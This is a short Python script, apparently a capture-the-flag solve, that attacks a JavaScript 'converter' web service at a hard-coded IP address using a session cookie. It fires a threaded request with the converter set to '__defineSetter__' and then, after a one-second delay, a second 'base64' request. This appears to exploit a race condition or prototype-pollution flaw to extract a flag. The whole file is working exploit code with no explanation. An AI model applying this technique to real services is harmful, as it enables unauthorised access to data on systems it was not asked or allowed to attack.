
import threading
import requests
import time

cookie = {"sessionId" : "HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa.YTlYOIhk52YHs3NzP%2FFPuu6y7MK1ev6uX21jHbgxMXE"}
def sendPayload():
    r = requests.post("http://34.85.124.174:59101",json={"converter":"__defineSetter__","input":"FLAG_HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa"},cookies=cookie)
    print(r.text)

threading.Thread(target=sendPayload).start()
time.sleep(1)
requests.post("http://34.85.124.174:59101",json={"converter":"base64","input":"FLAG_HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa"},cookies=cookie)